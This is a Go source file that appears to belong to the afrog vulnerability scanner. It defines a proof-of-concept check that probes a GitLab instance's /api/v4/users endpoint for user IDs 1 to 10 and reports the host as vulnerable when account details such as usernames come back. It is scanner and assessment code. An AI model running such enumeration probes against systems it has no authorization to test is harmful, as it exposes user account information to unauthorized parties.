package gopoc

import (
	"bytes"
	"errors"
	"net/http"
	"strconv"

	"github.com/remeh/sizedwaitgroup"
	"github.com/zan8in/afrog/pkg/poc"
	"github.com/zan8in/afrog/pkg/proto"
	http2 "github.com/zan8in/afrog/pkg/protocols/http"
)

var (
	gitlabApiUserEnumName = "gitlab-user-leak"
)

func gitlabApiUserEnum(args *GoPocArgs) (Result, error) {
	poc := poc.Poc{
		Id: gitlabApiUserEnumName,
		Info: poc.Info{
			Name:        "GitLab - User Information Disclosure Via Open API",
			Author:      "Suman_Kar",
			Severity:    "medium",
			Description: "",
			Reference: []string{
				"https://gitlab.com/gitlab-org/gitlab-foss/-/issues/40158",
			},
		},
	}
	args.SetPocInfo(poc)
	result := Result{Gpa: args, IsVul: false}

	if len(args.Target) == 0 {
		return result, errors.New("no host")
	}

	var req, body, raw_headers []byte
	var urltype proto.UrlType
	var err error

	flag := false
	swg := sizedwaitgroup.New(2)
	for i := 1; i <= 10; i++ {
		swg.Add()
		go func(i int) {
			defer swg.Done()
			if !flag {
				req, body, raw_headers, urltype, err = gitlabApiUserEnumGet(args.Target + "/api/v4/users/" + strconv.Itoa(i))
				if err == nil {
					flag = true
				}
			}
		}(i)
	}

	swg.Wait()

	if flag {
		result.IsVul = true
		result.SetAllPocResult(true, &urltype, req, []byte(string(raw_headers)+"\n"+string(body)))
		return result, nil
	}

	return result, errors.New("no vulner")
}

func gitlabApiUserEnumGet(target string) ([]byte, []byte, []byte, proto.UrlType, error) {
	// fmt.Println(target)
	req, err := http.NewRequest("GET", target, nil)
	if err != nil {
		return nil, nil, nil, proto.UrlType{}, errors.New("no poc")
	}
	request, body, raw_headers, status, utype, err := http2.Gopochttp(req, 0)
	if status == 200 && bytes.Contains(body, []byte("\"username\":")) && bytes.Contains(body, []byte("\"id\":")) && bytes.Contains(body, []byte("\"name\":")) {
		return request, body, raw_headers, *utype, nil
	}

	return nil, nil, nil, proto.UrlType{}, errors.New("no poc")
}

func init() {
	GoPocRegister("", gitlabApiUserEnum)
}
